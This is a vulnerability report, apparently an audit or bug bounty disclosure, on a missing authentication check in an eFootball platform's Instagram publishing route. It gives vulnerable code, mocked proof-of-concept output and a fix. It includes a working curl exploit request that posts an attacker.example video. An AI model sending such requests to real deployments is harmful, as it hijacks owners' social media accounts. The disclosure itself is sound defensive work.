# Unauthenticated Instagram Reel publishing with the server's stored token

- **Program / repo:** nftboy07/efootball (eFootball Community Tournament Platform)
- **Severity:** High
- **Status:** VERIFIED (passing PoC)
- **Attacker:** Any unprivileged, unauthenticated internet client

## Summary

`POST /api/instagram-publish` performs **no caller authentication of any kind**
(no `X-Admin-Key`, no session, no cookie, no cron secret). When the request body
omits `accessToken`, the publish path falls back to the server-configured
`INSTAGRAM_ACCESS_TOKEN` / `INSTAGRAM_ACCOUNT_ID`. As a result, anyone who can
reach the deployed site can publish an **arbitrary, attacker-chosen video** as an
Instagram Reel **to the owner's Instagram professional account**, using the
owner's long-lived Meta token held on the server.

## Exact location

- Route (missing auth): `app/api/instagram-publish/route.ts` → `POST`
- Credential fallback to server env: `app/lib/instagram.ts` → `resolveCredentials()` and `publishReel()`

```ts
// app/api/instagram-publish/route.ts  (POST) — no auth check before publishing
const result = await publishReel({
  videoUrl: body.videoUrl,
  caption: body.caption,
  accessToken: body.accessToken, // optional; omitted by attacker
  igUserId: body.igUserId,
});
```

```ts
// app/lib/instagram.ts — resolveCredentials falls back to the SERVER token
const token = (override?.accessToken || process.env.INSTAGRAM_ACCESS_TOKEN || '').trim();
const userId = (override?.igUserId || process.env.INSTAGRAM_ACCOUNT_ID || '').trim() || undefined;
```

The project itself documents that `ADMIN_KEY` is meant to gate privileged
actions ("FastAPI still requires `X-Admin-Key`… Vercel/Next.js injects that
header"), but this Next.js route never calls `serviceAdmin()` / checks any
credential. Compare `app/api/reels-queue/route.ts`, which does import
`serviceAdmin`. The publish route skips it entirely.

## Root cause

The route trusts that only the admin hub will ever call it, and uses the
server's env token as a convenience default. There is no authorization boundary
between "caller supplies their own token" and "caller uses the server's token",
so the server's credential is exposed to every anonymous caller.

## Impact (today, unprivileged attacker)

Against the live deployment an attacker can, with a single unauthenticated POST:

- Publish arbitrary video content (defacement, spam, scam, offensive/abusive
  material, misleading "official" announcements) to the owner's Instagram,
  attributed to the brand.
- Burn the account's daily publishing quota (the code assumes a 25/day limit)
  and trigger Meta spam/abuse enforcement — risking rate-limiting, content
  takedowns, or **permanent suspension** of the Instagram professional account
  and the linked Facebook Page.
- Do all of the above repeatedly and at scale; each call consumes the owner's
  token server-side, so the attacker never needs any credential.

No funds are at risk, but brand/account integrity and the Meta token's standing
are directly and immediately compromised.

## Proof of Concept

`security/poc/instagram_publish_unauth_poc.ts` exercises the **real** route
handler and the **real** `publishReel()` logic. Only the external Meta Graph API
is mocked (via `global.fetch`) so that **no live Instagram account or service is
touched**. The mock records exactly what the server sent to Meta, proving the
server used its own secret token together with the attacker's `videoUrl`.

### Run

```bash
npm install            # installs next + the tsx dev runner
npx tsx security/poc/instagram_publish_unauth_poc.ts
```

### Output (abridged)

```
=== HTTP response from /api/instagram-publish ===
status: 200
body  : {"success":true,"postId":"MOCK_PUBLISHED_POST_456","igUserId":"17841400000000000", ...}

=== Calls the server made to Meta Graph API ===
POST https://graph.facebook.com/v20.0/17841400000000000/media
   access_token = SERVER_ONLY_SECRET_ig_token_DO_NOT_LEAK
   video_url    = https://attacker.example/defaced-propaganda.mp4
   caption      = Pwned by an unauthenticated stranger
POST https://graph.facebook.com/v20.0/17841400000000000/media_publish
   access_token = SERVER_ONLY_SECRET_ig_token_DO_NOT_LEAK

=== Exploit assertions ===
PASS  Route returned HTTP 200 for an unauthenticated caller
PASS  Server used its OWN secret token (not supplied by attacker)
PASS  Server published to the OWNER account id
PASS  Attacker's videoUrl was sent to Meta
...
EXPLOIT CONFIRMED
```

The attacker request carries **no** `X-Admin-Key`, `Authorization`, or cookie,
and **no** `accessToken` in the body — yet the server publishes the attacker's
video with `SERVER_ONLY_SECRET_ig_token_DO_NOT_LEAK` to the owner's account id.

### Equivalent live request (do NOT run against production)

```bash
curl -X POST https://<deployed-site>/api/instagram-publish \
  -H 'content-type: application/json' \
  -d '{"videoUrl":"https://attacker.example/evil.mp4","caption":"..."}'
```

## Fix

Require admin authentication before using the server token. Concretely, the
route should reject callers that do not present a valid `ADMIN_KEY` (via
`serviceAdmin()` against the header the admin hub injects), **and** only fall
back to `process.env.INSTAGRAM_ACCESS_TOKEN` for authenticated callers. Callers
supplying their own `accessToken` could be allowed without admin auth, but the
server's stored token must never be reachable anonymously.

## Related (same missing-auth pattern — not separately PoC'd here)

- `app/api/admin/instagram-status/route.ts` (GET/POST) and
  `app/api/admin/ping/route.ts` call `inspectTokenHealth()` with the server
  token and have no auth, leaking token validity/expiry, scopes, linked
  account id/username, and service configuration to anonymous callers.
- `app/api/cron/auto-reel/route.ts` fails open when `CRON_SECRET` is unset:
  the auth check is skipped entirely, so the cron pipeline is anonymously
  triggerable in that configuration.
